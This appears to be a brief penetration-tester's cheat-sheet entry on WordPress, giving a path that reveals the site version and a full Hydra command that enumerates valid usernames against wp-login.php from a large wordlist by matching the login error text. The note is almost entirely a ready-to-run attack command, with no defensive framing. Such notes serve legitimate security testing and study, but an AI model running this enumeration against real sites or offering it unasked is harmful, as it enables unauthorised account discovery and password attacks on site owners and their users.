# Wordpress
## Find version
/wp-links-opml.php

## Enumerate valid users
```bash
hydra -L /opt/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p voidpass target  
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget%2  
Fwp-admin%2F&testcookie=1:S=The password"
```
